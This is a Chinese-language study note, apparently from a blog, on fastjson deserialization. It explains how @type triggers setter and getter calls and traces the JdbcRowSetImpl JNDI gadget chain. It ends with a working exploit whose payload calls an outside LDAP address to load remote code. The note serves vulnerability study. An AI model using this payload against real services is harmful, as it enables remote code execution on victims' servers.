# fastjson代码审计

为啥会出现命令执行

定义一个student类

fastjson和普通反序列化区别

```
//不需要实现serializable 
//变量不需要不是transient
//setter /getter 不是readObject   //变量有对应的setter或者是publich或者是满足条件的getter
//sink 反射/动态类加载
```

```java
package com.exp;

public class Student {

    private String name;
    private int age;

    public Student() {
        System.out.println(" method: Student() ");
    }

    public Student(String name , int age) {
        System.out.println(" method: Student(String name , int age) ");
        this.name = name;
        this.age = age;
    }

    public String getName() {
        System.out.println(" method: getName() ");
        return name;
    }

    public int getAge() {
        System.out.println(" method: getAge() ");
        return age;
    }

    public void setName(String name) {
        System.out.println(" method: setName() ");
        this.name = name;
    }

    public void setAge(int age) {
        System.out.println(" method setAge() ");
        this.age = age;
    }
}
```

```java
package com.exp;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.serializer.SerializerFeature;

public class demo {
    //fastjson提供了两个反序列化函数：parseObject和parse，我们通过示例程序来看一下fastjson的反序列化过程
    //toJSONString将对象转成字符串
    public static void main(String[] args) {
        Student student = new Student("moonsec" , 123);
        String jsonString1 = JSON.toJSONString(student);//是将对象转化为Json字符串
        System.out.println("转成json");
        System.out.println(jsonString1);
        System.out.println("转成json @type");
        String jsonString2 = JSON.toJSONString(student, SerializerFeature.WriteClassName); //自动加入 @type
        System.out.println(jsonString2);
        System.out.println("json转对象1");
        JSONObject jsonObject=JSON.parseObject(jsonString2);
        System.out.println(jsonObject);
        System.out.println("json转对象2");
        Student student1=JSON.parseObject(jsonString2,Student.class);
        System.out.println(student1);
        System.out.println("json转对象3");
        Object obj=JSON.parse(jsonString2);
        System.out.println(obj);

    }
}
```

![image-20240701092733610](D:\图片存放位置\image-20240701092733610.png)

方式一调用了parseObject方法将json数据反序列化成java对象，并且在反序列化过程中会调用对象的setter和getter方法。

方式二调用了parseObject方法进行反序列化，并且指定了反序列化对象Student类，parseObject方法会将json数据反序列化成Student对象，并且在反序列化过程中调用了Student对象的setter方法。

方式三调用了parse方法将json数据反序列化成java对象，并且在反序列化时调用了对象的setter方法。

本来客户想简单利用 JSONObject jsonObject=JSON.parse（分析）Object(s);将普通字符串转成json对象而当用户传入{"@type":"com.exp.Student","age":123,"name":"moonsec"}就会反序列化并且调用set和get方法

**关于Feature.SupportNonPublicField参数**

以上这三种方式在进行反序列化时都会调用对象的构造方法创建对象，并且还会调用对象的setter方法，如果私有属性没有提供setter方法时，那么还会正确被反序列化成功吗？为了验证这个猜想，现在我们把Student对象的私有属性name的setter方法去掉。

从程序执行结果来看，私有属性name并没有被正确反序列化，也就是说fastjson默认情况下不会对私有属性进行反序列化。

如果需要将私有属性反序列化时，就可以调用parseObject方法指定Feature.SupportNonPublicField参数.

## 2 利用链分析

终点是这里执行了lookup函数然后这个getDatasourceName是可控的

![image-20240703095513267](D:\图片存放位置\image-20240703095513267.png)

由于fastjson会自动调用setter方法所以这个是可控的·

![image-20240703095736802](D:\图片存放位置\image-20240703095736802.png)

现在我们需要去找谁调用了connet发现这个方法调用了并且会自动调用

![image-20240703095914191](D:\图片存放位置\image-20240703095914191.png)

编写exp

```java
package com.exp;

import com.alibaba.fastjson.JSON;

public class demo3 {
    public static void main(String[] args) {

        //不需要实现serializable  序列化
        //变量不需要不是transient
        //setter /getter 不是readObject   //变量有对应的setter或者是publich或者是满足条件的getter
        //sink 反射/动态类加载
        String s="{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"DataSourceName\":\"ldap://101.34.84.157:8085/WVvfcmrg\",\"AutoCommit\":\"false\"}";
        JSON.parseObject(s);
    }
}

```

